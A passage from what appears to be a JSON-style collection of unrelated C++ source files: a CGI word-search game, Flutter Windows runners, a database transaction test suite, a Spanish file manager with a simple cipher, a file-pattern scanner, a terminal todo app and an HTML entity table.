numcols << \"<br>\";\r\n                cout << \"<br>\";\r\n                cout << \"<table class='center'>\";\r\n                for(int i = 0; i < numrows; i++){\r\n                    cout << \"<tr>\";\r\n                    for(int j = 0; j < numcols; j++){\r\n                        \r\n                        cout << \"<td>\" << mdarray[i][j] << \"</td>\" ;\r\n                        \r\n                    }\r\n                    cout << \"</tr>\";\r\n                    //cout << \"<br>\";\r\n                }\r\n                cout << \"</table>\";\r\n                \r\n                vector<vector<char> > textGrid(mdarray.size());\r\n                for (int i = 0; i < mdarray.size(); i++) {\r\n                    textGrid[i].resize(mdarray[i].size());\r\n                    for (int j = 0; j < mdarray[i].size(); j++) {\r\n                        textGrid[i][j] = static_cast<char>(mdarray[i][j]);\r\n                    }\r\n                }\r\n                cout << \"<hr>\";\r\n                //Button to display hidden section\r\n                cout << \"<button onclick='myFunction()'>Click here to see data uploaded from file!</button>\";\r\n                cout << \"<div id='myDIV'>\";\r\n                cout << \"<br>\";\r\n                cout << \"Height: \" << numrows << \", Width: \" << numcols << \"<br>\";\r\n                cout << \"<br>\";\r\n                \r\n                vector<vector<float> > details;\r\n                vector<vector<bool> > visited(mdarray.size(), vector<bool>(mdarray[0].size(), false));\r\n\r\n                int objectCount = 1;\r\n                searchAndMarkPattern(textGrid, input, objectCount, visited, numrows, numcols, counter, guess);\r\n            }\r\n        }\r\n        else if (option == \"upload\"){\r\n\r\n            cout << \"You started a pregen game.\" << endl;\r\n            string input = cgi(\"ucharinput\");\r\n            string file;\r\n            string uintinput = cgi(\"uintinput\");\r\n            if (isNumber(input)) {\r\n                cout << \"<br>\";\r\n                cout << \"<font color='red'>Please only enter letters...</font>\" << endl;\r\n            } else {\r\n                int fguess = s_to_int(uintinput);\r\n                const_file_ite",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"loan_calculator\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"execution/execution_manager.h\"\n#include \"transaction_manager.h\"\n#include \"gtest/gtest.h\"\n#include \"interp.h\"\n\n#define BUFFER_LENGTH 8192\n\nclass TransactionTest : public::testing::Test {\npublic:\n    std::string db_name_ = \"Txn_Test_DB\";\n    std::unique_ptr<DiskManager> disk_manager_;\n    std::unique_ptr<BufferPoolManager> buffer_pool_manager_;\n    std::unique_ptr<RmManager> rm_manager_;\n    std::unique_ptr<IxManager> ix_manager_;\n    std::unique_ptr<SmManager> sm_manager_;\n    std::unique_ptr<QlManager> ql_manager_;\n    std::unique_ptr<LogManager> log_manager_;\n    std::unique_ptr<LockManager> lock_manager_;\n    std::unique_ptr<TransactionManager> txn_manager_;\n    std::unique_ptr<Interp> interp_;\n    txn_id_t txn_id = INVALID_TXN_ID;\n    char *result = new char[BUFFER_LENGTH];\n    int offset;\n\npublic:\n    // This function is called before every test.\n    void SetUp() override {\n        ::testing::Test::SetUp();\n        // For each test, we create a new BufferPoolManager...\n        disk_manager_ = std::make_unique<DiskManager>();\n        buffer_pool_manager_ = std::make_unique<BufferPoolManager>(BUFFER_POOL_SIZE, disk_manager_.get());\n        rm_manager_ = std::make_unique<RmManager>(disk_manager_.get(), buffer_pool_manager_.get());\n        ix_manager_ = std::make_unique<IxManager>(disk_manager_.get(), buffer_pool_manager_.get());\n        sm_manager_ = std::make_unique<SmManager>(disk_manager_.get(), buffer_pool_manager_.get(), rm_manager_.get(),\n                                                  ix_manager_.get());\n        ql_manager_ = std::make_unique<QlManager>(sm_manager_.get());\n        log_manager_ = std::make_unique<LogManager>(disk_manager_.get());\n        log_manager_->SetLogMode(false);\n        lock_manager_ = std::make_unique<LockManager>();\n        txn_manager_ = std::make_unique<TransactionManager>(lock_manager_.get(), sm_manager_.get());\n        interp_ = std::make_unique<Interp>(sm_manager_.get(), ql_manager_.get(), txn_manager_.get());\n        // create db and open db\n        if (sm_manager_->is_dir(db_name_)) {\n            sm_manager_->drop_db(db_name_);\n        }\n        sm_manager_->create_db(db_name_);\n        sm_manager_->open_db(db_name_);\n    }\n\n    // This function is called after every test.\n    void TearDown() override {\n        sm_manager_->close_db();  // exit\n        // sm_manager_->drop_db(db_name_);  // \u82e5\u4e0d\u5220\u9664\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u5219\u5c06\u4fdd\u7559\u6700\u540e\u4e00\u4e2a\u6d4b\u8bd5\u70b9\u7684\u6570\u636e\u5e93\n    };\n\n    // The below helper functions are useful for testing.\n    void exec_sql(const std::string &sql) {\n        YY_BUFFER_STATE yy_buffer = yy_scan_string(sql.c_str());\n        assert(yyparse() == 0 && ast::parse_tree != nullptr);\n        yy_delete_buffer(yy_buffer);\n        memset(result, 0, BUFFER_LENGTH);\n        offset = 0;\n        Context *context = new Context(lock_manager_.get(), log_manager_.get(),\n                                       nullptr, result, &offset);\n        interp_->interp_sql(ast::parse_tree, &txn_id, context);  // \u4e3b\u8981\u6267\u884c\u903b\u8f91\n    };\n};\n\nTEST_F(TransactionTest, BeginTest) {\n    Transaction *txn = nullptr;\n    txn = txn_manager_->Begin(txn, log_manager_.get());\n\n    EXPECT_EQ(txn_manager_->txn_map.size(), 1);\n    EXPECT_NE(txn, nullptr);\n    EXPECT_EQ(txn->GetState(), TransactionState::DEFAULT);\n}\n\n// test commit\nTEST_F(TransactionTest, CommitTest) {\n    exec_sql(\"create table t1 (num int);\");\n    exec_sql(\"begin;\");\n    exec_sql(\"insert into t1 values(1);\");\n    exec_sql(\"insert into t1 values(2);\");\n    exec_sql(\"insert into t1 values(3);\");\n    exec_sql(\"update t1 set num = 4 where num = 1;\");\n    exec_sql(\"delete from t1 where num = 3;\");\n    exec_sql(\"commit;\");\n    exec_sql(\"select * from t1;\");\n    const char *str = \"+------------------+\\n\"\n        \"|              num |\\n\"\n        \"+------------------+\\n\"\n        \"|                4 |\\n\"\n        \"|                2 |\\n\"\n        \"+------------------+\\n\"\n        \"Total record(s): 2\\n\";\n    EXPECT_STREQ(result, str);\n    // there should be 3 transactions\n    EXPECT_EQ(txn_manager_->GetNextTxnId(), 3);\n    Transaction *txn = txn_manager_->GetTransaction(1);\n    EXPECT_EQ(txn->GetState(), TransactionState::COMMITTED);\n}\n\n// test abort\nTEST_F(TransactionTest, AbortTest) {\n    exec_sql(\"create table t1 (num int);\");\n    exec_sql(\"begin;\");\n    exec_sql(\"insert into t1 values(1);\");\n    exec_sql(\"insert into t1 values(2);\");\n    exec_sql(\"insert into t1 values(3);\");\n    exec_sql(\"update t1 set num = 4 where num = 1;\");\n    exec_sql(\"delete from t1 where num = 3;\");\n    exec_sql(\"abort;\");\n    exec_sql(\"select * from t1;\");\n    const char * str = \"+------------------+\\n\"\n        \"|              num |\\n\"\n        \"+------------------+\\n\"\n        \"+------------------+\\n\"\n        \"Total record(s): 0\\n\";\n    EXPECT_STREQ(result, str);\n    EXPECT_EQ(txn_manager_->GetNextTxnId(), 3);\n    Transaction *txn = txn_manager_->GetTransaction(1);\n    EXPECT_EQ(txn->GetState(), TransactionState::ABORTED);\n}\n\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include <filesystem> // Para manejar archivos y directorios\n#include <iomanip> // Para formatear la salida\n#include <stdio.h>\nusing namespace std;\nnamespace fs = std::filesystem;\n\n// Funci\u00f3n para encriptar contenido\nstring encriptar(const string& contenido, const string& clave) {\n    string contenidoEncriptado = contenido;\n    // Algoritmo simple de encriptaci\u00f3n\n    for (size_t i = 0; i < contenidoEncriptado.length(); ++i) {\n        contenidoEncriptado[i] += clave[i % clave.length()];\n    }\n    return contenidoEncriptado;\n}\n\n// Funci\u00f3n para desencriptar contenido\nstring desencriptar(const string& contenidoEncriptado, const string& clave) {\n    string contenidoDesencriptado = contenidoEncriptado;\n    // Algoritmo simple de desencriptaci\u00f3n\n    for (size_t i = 0; i < contenidoDesencriptado.length(); ++i) {\n        contenidoDesencriptado[i] -= clave[i % clave.length()];\n    }\n    return contenidoDesencriptado;\n}\n\nvoid crearArchivo() {\n    string directorio, nombreArchivo, contenido;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    cout << \"Ingrese el contenido del archivo:\" << endl;\n    getline(cin, contenido);\nrename(\"directorio+nombreArchivo\",\"nombreArchivo\");\n    ofstream archivo(rutaArchivo);\n    if (archivo.is_open()) {\n        string contenidoEncriptado = encriptar(contenido, \"clave\"); // Encriptar con clave\n        archivo << contenidoEncriptado << endl;\n        archivo.close();\n        cout << \"Archivo creado exitosamente.\" << endl;\n    } else {\n        cout << \"No se pudo abrir el archivo para escritura.\" << endl;\n    }\n}\n\nvoid leerArchivo() {\n    string directorio, nombreArchivo;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    ifstream archivoEntrada(rutaArchivo);\n    if (archivoEntrada.is_open()) {\n        string linea;\n        while (getline(archivoEntrada, linea)) {\n            string lineaDesencriptada = desencriptar(linea, \"clave\"); // Desencriptar con clave\n            cout << lineaDesencriptada << endl;\n        }\n        archivoEntrada.close();\n    } else {\n        cout << \"No se pudo abrir el archivo para lectura.\" << endl;\n    }\n}\n\nvoid escribirArchivo() {\n    string directorio, nombreArchivo, contenido;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    ofstream archivo(rutaArchivo, ios::app); // Abre el archivo en modo de a\u00f1adir al final\n    if (archivo.is_open()) {\n        cout << \"Ingrese el contenido que desea agregar al archivo:\" << endl;\n        getline(cin, contenido);\n        string contenidoEncriptado = encriptar(contenido, \"clave\"); // Encriptar con clave\n        archivo << contenidoEncriptado << endl;\n        archivo.close();\n        cout << \"Contenido agregado al archivo exitosamente.\" << endl;\n    } else {\n        cout << \"No se pudo abrir el archivo para escritura.\" << endl;\n    }\n}\n\nvoid listarArchivosCreados(const string& directorio) {\n    cout << \"Archivos creados en el directorio '\" << directorio << \"':\" << endl;\n    for (const auto& entry : fs::directory_iterator(directorio)) {\n        if (entry.is_regular_file()) {\n            cout << entry.path().filename() << endl;\n        }\n    }\n}\n\nvoid verContenidoArchivos(const vector<string>& archivos) {\n    for (const auto& archivo : archivos) {\n        cout << \"Contenido del archivo '\" << archivo << \"':\" << endl;\n        ifstream archivoEntrada(archivo);\n        if (archivoEntrada.is_open()) {\n            string linea;\n            while (getline(archivoEntrada, linea)) {\n                string lineaDesencriptada = desencriptar(linea, \"clave\"); // Desencriptar con clave\n                cout << lineaDesencriptada << endl;\n            }\n            archivoEntrada.close();\n        } else {\n            cout << \"No se pudo abrir el archivo para lectura.\" << endl;\n        }\n        cout << \"------------------------------------------\" << endl;\n    }\n}\nvoid mover() {\n    string directorio, nombreArchivo,directorio2;\n    cout << \"Ingrese el directorio del archivo: \";\n    getline(cin, directorio);\n\n    cout << \"Ingrese el nombre del archivo: \";\n    getline(cin, nombreArchivo);\n\n    string rutaArchivo = directorio + '/' + nombreArchivo;\n\n    cout << \"Ingrese el nuevo directorio del archivo: \";\n    getline(cin, directorio2);\n\n    string rutaArchivo2 = directorio2 + '/' + nombreArchivo;\n\n    // Construye las rutas completas tanto para el antiguo como para el nuevo nombre de archivo\n    string ruta_antiguo = rutaArchivo;\n    s",
    "\ufeff/**\n * @file main.cpp\n * @brief Entry point for the application.\n */\n\n#include \"Tools/CommandLineParser.h\" \n#include \"Tools/Logger.h\"\n#include \"Gui/Gui.h\"\n#include \"Application/Application.h\"\n#include <iostream>\n#include <iostream>\n\nint main(int argc, char* argv[])\n{\n    tools::ConsoleLogger logger;\n\n    try\n    {\n        // Command line argument parsing\n        tools::CommandLineParser parser;\n        parser.parse(argc, argv);\n\n        // Create EventBridge\n        tadaima::EventBridge bridge;\n\n        // Create GUI with configuration\n        tadaima::gui::Gui::config config;\n        tadaima::gui::Gui gui(logger, config);\n\n        // Create and configure the application\n        tadaima::application::Application application(logger, bridge);\n\n        bridge.initialize(application, gui);\n        application.Initialize();\n        application.run();\n\n        // Run the GUI\n        gui.run();\n    }\n\n    // Catch any exceptions and display error message\n    catch( const std::exception& e )\n    {\n        logger.log(std::format(\"Error: {}\", e.what()), tools::LogLevel::PROBLEM);\n        return 1;\n    }\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <cstdio>\n#include <string>\n\nstd::vector<std::string> fileList;\nstd::vector<std::string> pyFilter;\nstd::vector<std::string> phpFilter;\nstd::vector<std::string> csFilter;\nstd::vector<std::string> warningList;\nint returnCode = 0;\n\nvoid createPhpFilter() {\n    std::ifstream conf(\"phpFilter.wwwqr\");\n    if (!conf.is_open()) {\n        std::cout << \"\\n\\nCould not open phpFilter.wwwqr.\\n\\n\";\n        return;\n    }\n    std::string line;\n    while(std::getline(conf, line)) {\n        phpFilter.emplace_back(line);\n    }\n    conf.close();\n}\n\nvoid createPyFilter() {\n    std::ifstream conf(\"pyFilter.wwwqr\");\n    if (!conf.is_open()) {\n        std::cout << \"\\n\\nCould not open pyFilter.wwwqr.\\n\\n\";\n        return;\n    }\n    std::string line;\n    while (std::getline(conf, line)) {\n        pyFilter.emplace_back(line);\n    }\n    conf.close();\n}\n\nvoid createCsFilter() {\n    std::ifstream conf(\"csFilter.wwwqr\");\n    if (!conf.is_open()) {\n        std::cout << \"\\n\\nCould not open csFilter.wwwqr.\\n\\n\";\n        return;\n    }\n    std::string line;\n    while (std::getline(conf, line)) {\n        csFilter.emplace_back(line);\n    }\n    conf.close();\n}\n\nvoid createFilters() {\n    createPhpFilter();\n    createPyFilter();\n    createCsFilter();\n}\n\nstd::string exec(const char* cmd) {\n    FILE* pipe = popen(cmd, \"r\");\n    if (!pipe) return \"ERROR\";\n    char buffer[128];\n    std::string result = \"\";\n    while (!feof(pipe)) {\n        if (fgets(buffer, 128, pipe) != NULL)\n            result += buffer;\n    }\n    pclose(pipe);\n    return result;\n}\n\nstd::string getExtentionName(std::string path) {\n    int pos = path.find_last_of('.');\n    if (pos != std::string::npos) {\n        return path.substr(pos + 1);\n    }\n    return \"\";\n}\n\nvoid setFileList() {\n    fileList.clear();\n    std::string tmpStr = exec(\"find ../ -type f\");\n    std::string cache = \"\";\n    for (char c : tmpStr) {\n        if (c == '\\n') {\n            fileList.emplace_back(cache);\n            cache = \"\";\n        }\n        else {\n            cache += c;\n        }\n    }\n}\n\nvoid checkFiles(const std::string &whitelistPath) {\n    for (auto& str : fileList) {\n        std::ifstream file(str);\n        std::string line;\n        if (!file.is_open()) {\n            continue;\n        }\n        //whitelist check\n        std::ifstream whitelist((\"../\" + whitelistPath).c_str());\n\n        if (whitelist.is_open()) {\n            std::string tmpWLine;\n            bool isWhite = false;\n            while (std::getline(whitelist, tmpWLine)) {\n                if (str == tmpWLine) {\n                    isWhite = true;\n                    break;\n                }\n            }\n            whitelist.close();\n            if (isWhite) {\n                continue;\n            }\n        }\n        else {\n            std::cout << \"\\n\\n\" << whitelistPath << \" file not found.\\n\\n\";\n        }\n        //\n        int lineCount = 0;\n\n        std::vector<std::string> activeFilter;\n\n        std::string file_ext = getExtentionName(str);\n\n        if (file_ext == \"php\") {\n            activeFilter = phpFilter;\n        }\n        else if (file_ext == \"py\") {\n            activeFilter = pyFilter;\n        }\n        else if (file_ext == \"cs\") {\n            activeFilter = csFilter;\n        }\n\n        while (std::getline(file, line)) {\n            ++lineCount;\n            for (auto& val : activeFilter) {\n                int tmpP = line.find(val);\n                if (tmpP != std::string::npos) {\n                    warningList.emplace_back(\"Error at line \" + std::to_string(lineCount) + \" in '\" + str + \"' Filter: (\" + val + \")\\n\");\n                    if (returnCode == 0) {\n                        returnCode = 1;\n                    }\n                }\n            }\n        }\n        file.close();\n    }\n}\n\nint main(int argc, char* argv[]) {\n    if (argc < 2) {\n        throw std::runtime_error(\"Error: no whitelist argument given.\\n\");\n    }\n    setFileList();\n    createFilters();\n    checkFiles(argv[1]);\n    for (auto& str : warningList) {\n        std::cout << str;\n    }\n    return returnCode;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n#include <cstdlib>\n#include <stdexcept>\n#include <chrono>\n#include <thread>\nusing namespace std;\n\n// Change this file name if needed\nconst string userHome = getenv(\"HOME\"); \nconst string mainFile = userHome + \"/.config/todominal/todos.txt\";\n\n// Define colors for priorities\nstring RED = \"\\033[1;31m\";\nstring YELLOW = \"\\033[1;33m\";\nstring GREEN = \"\\033[1;32m\";\nstring RESET = \"\\033[0m\";\n\n// Function to remove a line from a specific line from a file\nvoid removeLine(const string& filename, int lineNumberToRemove) {\n    ifstream inputFile(filename);\n    vector<string> lines;\n\n    if (inputFile.is_open()) {\n        string line;\n        int currentLine = 1;\n        while (getline(inputFile, line)) {\n            if (currentLine != lineNumberToRemove) {\n                lines.push_back(line); // Keep the line if it's not the one to remove\n            }\n            currentLine++;\n        }\n        inputFile.close();\n\n        // Write the modified content back to the file\n        ofstream outputFile(filename);\n        if (outputFile.is_open()) {\n            for (const string& line : lines) {\n                outputFile << line << endl;\n            }\n            outputFile.close();\n        } else {\n            cerr << \"Unable to open output file: \" << filename << endl;\n        }\n    } else {\n        cerr << \"Unable to open input file: \" << filename << endl;\n    }\n}\n\n// Functiom to get a specific line of a file\nstring getLineContent(const string& filename, int lineNumber) {\n    ifstream file(filename);\n    string lineContent;\n    int currentLine = 1;\n\n    if (file.is_open()) {\n        string line;\n        while (getline(file, line)) {\n            if (currentLine == lineNumber) {\n                lineContent = line;\n                break;\n            }\n            currentLine++;\n        }\n        file.close();\n    } else {\n        cerr << \"Unable to open file: \" << filename << endl;\n    }\n\n    return lineContent;\n}\n\n// Function to Replace a line with a given line\nvoid replaceLine(const string& filename, int lineNumber, const string& newLine) {\n    ifstream inputFile(filename);\n    vector<string> lines;\n\n    if (inputFile.is_open()) {\n        string line;\n        int currentLine = 1;\n        while (getline(inputFile, line)) {\n            if (currentLine == lineNumber) {\n                lines.push_back(newLine); // Replace the line with newLine\n            } else {\n                lines.push_back(line); // Keep the original line\n            }\n            currentLine++;\n        }\n        inputFile.close();\n\n        // Write the modified content back to the file\n        ofstream outputFile(filename);\n        if (outputFile.is_open()) {\n            for (const string& line : lines) {\n                outputFile << line << endl;\n            }\n            outputFile.close();\n        } else {\n            cerr << \"Unable to open output file\\n\";\n        }\n    } else {\n        cerr << \"Unable to open input file\\n\";\n    }\n}\n\n// Function to StrikeThrough given text\nstring strikethrough(const string& text) \n{\n    string result;\n    result = \"\\e[9m\" + text + \"\\e[m\"; \n    return result;\n}\n\n// Function to remove a todo, check for int\nvoid removeTodo() {\n    string toRemove;\n    cout << \"Enter Todo Index to Remove: \";\n    std::cin >> toRemove;\n\n    bool isValid = true;\n    for (char c : toRemove) {\n        if (!isdigit(c)) {\n            isValid = false;\n            break;\n        }\n    }\n\n    if (isValid) {\n        int toRemoveint = stoi(toRemove);\n        removeLine(mainFile, toRemoveint);\n    } else {\n        cerr << \"Invalid input. Please enter a valid integer index.\" << endl;\n    }\n}\n\n\n// Function to mark a todo as done\nvoid markDone() {\n    string markInput;\n    cout << \"Enter Todo Index to Mark as Done: \";\n    std::cin >> markInput;\n    int markNum = stoi(markInput);\n    replaceLine(mainFile, markNum, strikethrough(getLineContent(mainFile, markNum)));\n}\n\n// Function to print indexed contents of a file\nvoid printTodo() {\n    int i = 1;\n    ifstream todos(mainFile);\n    if (todos.is_open()) {\n        string line;\n        while (getline(todos, line)) {\n            string color;\n            if (line.find(\"(h)\") != string::npos) {\n                color = RED;\n            } else if (line.find(\"(m)\") != string::npos) {\n                color = YELLOW;\n            } else if (line.find(\"(l)\") != string::npos) {\n                color = GREEN;\n            } else {\n                color = RESET;\n            }\n            cout << i << \". \" << color << line << RESET << endl;\n            i++;\n        }\n        todos.close();\n    } else {\n        cerr << \"Unable to open file\\n\";\n        exit(1);\n    }\n}\n\nvoid printTodoRofi() {\n    RED = \"<span foreground=\\\"#f38ba8\\\">\";\n    YELLOW = \"<span foreground=\\\"#f9e2af\\\">\";\n    GREEN = \"<span foreground=\\\"#a6e3a1\\\">\";\n    RESET = \"</span>\";\n    int i = 1;\n    ifstream todos(mainFile);\n    if (todos.is_open()) {\n        string line;\n        wh",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"farm_optics\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"htmlentityparser.h\"\n#include \"stringutils.h\"\n\n#include <cassert>\n\nnamespace plutobook {\n\nstruct HTMLEntity {\n    char lastCharacter() const { return name[length - 1]; }\n    uint32_t firstValue;\n    uint16_t secondValue;\n    uint16_t length;\n    const char* name;\n};\n\nstatic const HTMLEntity htmlentitytable[] = {\n    {0x000C6, 0x00000, 5, \"AElig\"},\n    {0x000C6, 0x00000, 6, \"AElig;\"},\n    {0x00026, 0x00000, 3, \"AMP\"},\n    {0x00026, 0x00000, 4, \"AMP;\"},\n    {0x000C1, 0x00000, 6, \"Aacute\"},\n    {0x000C1, 0x00000, 7, \"Aacute;\"},\n    {0x00102, 0x00000, 7, \"Abreve;\"},\n    {0x000C2, 0x00000, 5, \"Acirc\"},\n    {0x000C2, 0x00000, 6, \"Acirc;\"},\n    {0x00410, 0x00000, 4, \"Acy;\"},\n    {0x1D504, 0x00000, 4, \"Afr;\"},\n    {0x000C0, 0x00000, 6, \"Agrave\"},\n    {0x000C0, 0x00000, 7, \"Agrave;\"},\n    {0x00391, 0x00000, 6, \"Alpha;\"},\n    {0x00100, 0x00000, 6, \"Amacr;\"},\n    {0x02A53, 0x00000, 4, \"And;\"},\n    {0x00104, 0x00000, 6, \"Aogon;\"},\n    {0x1D538, 0x00000, 5, \"Aopf;\"},\n    {0x02061, 0x00000, 14, \"ApplyFunction;\"},\n    {0x000C5, 0x00000, 5, \"Aring\"},\n    {0x000C5, 0x00000, 6, \"Aring;\"},\n    {0x1D49C, 0x00000, 5, \"Ascr;\"},\n    {0x02254, 0x00000, 7, \"Assign;\"},\n    {0x000C3, 0x00000, 6, \"Atilde\"},\n    {0x000C3, 0x00000, 7, \"Atilde;\"},\n    {0x000C4, 0x00000, 4, \"Auml\"},\n    {0x000C4, 0x00000, 5, \"Auml;\"},\n    {0x02216, 0x00000, 10, \"Backslash;\"},\n    {0x02AE7, 0x00000, 5, \"Barv;\"},\n    {0x02306, 0x00000, 7, \"Barwed;\"},\n    {0x00411, 0x00000, 4, \"Bcy;\"},\n    {0x02235, 0x00000, 8, \"Because;\"},\n    {0x0212C, 0x00000, 11, \"Bernoullis;\"},\n    {0x00392, 0x00000, 5, \"Beta;\"},\n    {0x1D505, 0x00000, 4, \"Bfr;\"},\n    {0x1D539, 0x00000, 5, \"Bopf;\"},\n    {0x002D8, 0x00000, 6, \"Breve;\"},\n    {0x0212C, 0x00000, 5, \"Bscr;\"},\n    {0x0224E, 0x00000, 7, \"Bumpeq;\"},\n    {0x00427, 0x00000, 5, \"CHcy;\"},\n    {0x000A9, 0x00000, 4, \"COPY\"},\n    {0x000A9, 0x00000, 5, \"COPY;\"},\n    {0x00106, 0x00000, 7, \"Cacute;\"},\n    {0x022D2, 0x00000, 4, \"Cap;\"},\n    {0x02145, 0x00000, 21, \"CapitalDifferentialD;\"},\n    {0x0212D, 0x00000, 8, \"Cayleys;\"},\n    {0x0010C, 0x00000, 7, \"Ccaron;\"},\n    {0x000C7, 0x00000, 6, \"Ccedil\"},\n    {0x000C7, 0x00000, 7, \"Ccedil;\"},\n    {0x00108, 0x00000, 6, \"Ccirc;\"},\n    {0x02230, 0x00000, 8, \"Cconint;\"},\n    {0x0010A, 0x00000, 5, \"Cdot;\"},\n    {0x000B8, 0x00000, 8, \"Cedilla;\"},\n    {0x000B7, 0x00000, 10, \"CenterDot;\"},\n    {0x0212D, 0x00000, 4, \"Cfr;\"},\n    {0x003A7, 0x00000, 4, \"Chi;\"},\n    {0x02299, 0x00000, 10, \"CircleDot;\"},\n    {0x02296, 0x00000, 12, \"CircleMinus;\"},\n    {0x02295, 0x00000, 11, \"CirclePlus;\"},\n    {0x02297, 0x00000, 12, \"CircleTimes;\"},\n    {0x02232, 0x00000, 25, \"ClockwiseContourIntegral;\"},\n    {0x0201D, 0x00000, 22, \"CloseCurlyDoubleQuote;\"},\n    {0x02019, 0x00000, 16, \"CloseCurlyQuote;\"},\n    {0x02237, 0x00000, 6, \"Colon;\"},\n    {0x02A74, 0x00000, 7, \"Colone;\"},\n    {0x02261, 0x00000, 10, \"Congruent;\"},\n    {0x0222F, 0x00000, 7, \"Conint;\"},\n    {0x0222E, 0x00000, 16, \"ContourIntegral;\"},\n    {0x02102, 0x00000, 5, \"Copf;\"},\n    {0x02210, 0x00000, 10, \"Coproduct;\"},\n    {0x02233, 0x00000, 32, \"CounterClockwiseContourIntegral;\"},\n    {0x02A2F, 0x00000, 6, \"Cross;\"},\n    {0x1D49E, 0x00000, 5, \"Cscr;\"},\n    {0x022D3, 0x00000, 4, \"Cup;\"},\n    {0x0224D, 0x00000, 7, \"CupCap;\"},\n    {0x02145, 0x00000, 3, \"DD;\"},\n    {0x02911, 0x00000, 9, \"DDotrahd;\"},\n    {0x00402, 0x00000, 5, \"DJcy;\"},\n    {0x00405, 0x00000, 5, \"DScy;\"},\n    {0x0040F, 0x00000, 5, \"DZcy;\"},\n    {0x02021, 0x00000, 7, \"Dagger;\"},\n    {0x021A1, 0x00000, 5, \"Darr;\"},\n    {0x02AE4, 0x00000, 6, \"Dashv;\"},\n    {0x0010E, 0x00000, 7, \"Dcaron;\"},\n    {0x00414, 0x00000, 4, \"Dcy;\"},\n    {0x02207, 0x00000, 4, \"Del;\"},\n    {0x00394, 0x00000, 6, \"Delta;\"},\n    {0x1D507, 0x00000, 4, \"Dfr;\"},\n    {0x000B4, 0x00000, 17, \"DiacriticalAcute;\"},\n    {0x002D9, 0x00000, 15, \"DiacriticalDot;\"},\n    {0x002DD, 0x00000, 23, \"DiacriticalDoubleAcute;\"},\n    {0x00060, 0x00000, 17, \"DiacriticalGrave;\"},\n    {0x002DC, 0x00000, 17, \"DiacriticalTilde;\"},\n    {0x022C4, 0x00000, 8, \"Diamond;\"},\n    {0x02146, 0x00000, 14, \"DifferentialD;\"},\n    {0x1D53B, 0x00000, 5, \"Dopf;\"},\n    {0x000A8, 0x00000, 4, \"Dot;\"},\n    {0x020DC, 0x00000, 7, \"DotDot;\"},\n    {0x02250, 0x00000, 9, \"DotEqual;\"},\n    {0x0222F, 0x00000, 22, \"DoubleContourIntegral;\"},\n    {0x000A8, 0x00000, 10, \"DoubleDot;\"},\n    {0x021D3, 0x00000, 16, \"DoubleDownArrow;\"},\n    {0x021D0, 0x00000, 16, \"DoubleLeftArrow;\"},\n    {0x021D4, 0x00000, 21, \"DoubleLeftRightArrow;\"},\n    {0x02AE4, 0x00000, 14, \"DoubleLeftTee;\"},\n    {0x027F8, 0x00000, 20, \"DoubleLongLeftArrow;\"},\n    {0x027FA, 0x00000, 25, \"DoubleLongLeftRightArrow;\"},\n    {0x027F9, 0x00000, 21, \"DoubleLongRightArrow;\"},\n    {0x021D2, 0x00000, 17, \"DoubleRightArrow;\"},\n    {0x022A8, 0x00000, 15, 